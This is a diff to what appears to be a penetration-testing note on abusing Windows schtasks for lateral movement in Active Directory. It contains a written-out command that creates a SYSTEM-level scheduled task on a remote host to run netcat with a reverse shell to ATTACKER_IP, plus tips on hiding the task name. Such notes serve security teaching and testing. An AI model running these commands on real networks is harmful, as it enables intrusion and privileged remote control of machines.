@@ -17,7 +17,7 @@ schtasks /s TARGET /ru "SYSTEM" /create /tn "<taskname>" /tr "<command/payload t
 * `/create` : Specify to create task
 * `/s`: Specifies the name or IP address of a remote computer (with or without backslashes. Default is the local computer
 * `/ru` : Runs that task with permission of the specified user account
-  * eg. `/ru "SYSTEM"` runs the task with the local system account, a highly privileged account used by the operating system and system services
+  * eg. `/ru "SYSTEM"` runs the task with the **local system account**, a highly privileged account used by the operating system and system services
 * `/tn` : Specifies a name for the task
 * `/tr` : Specifies the program or command that the task runs
 * `/u` , `/p` : command will run as the permissions of the username, and password of the user respectively&#x20;
@@ -40,13 +40,22 @@ schtasks /s TARGET /run /tn  "<taskname>" /u "<username>" /p "<password>"
 
 Suppose we have breached a machine (`mach1`) on the AD network, along with credentials for an admin account (member of the **Administrators** group) that can be used on the target machine (`mach2`). We can perform the following sequence of commands to obtain a privileged reverse shell on the target machine (`mach2`). Let's assume the obtained admin credentials are: `admin` , `pass` .
 
-{% code title="mach1 (breached machine)" %}
+> Assume that `nc64.exe` is present on the target machine, or we have somehow managed to upload a reverse shell payload via a SMB share, etc.
+
+{% code title="mach1 (breached machine)" overflow="wrap" %}
 ```powershell
 # ofcourse we want to change the taskname  to something less suspicious 
+#(1)
 C:\> schtasks /create /s mach2.xxxx /ru "SYSTEM" /u "admin" /p pass /tn "revshell" /tr "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP <PORT>" /sc ONCE /sd xxxx /st xxx 
+
+#(2) same command as (1), just with different payload
+C:\> schtasks /create ... /ru "SYSTEM" /tn "revshell" /tr "%windir%\rvshell.exe"  
+
 C:\> schtasks /run /s mach2.xxxx  /tn  "revshell" 
 ```
 {% endcode %}
+
+The `/ru "SYSTEM"` option specifies to run the task as the local system account, that allows us to gain a privileged shell.
 
 #### Cleanup
 
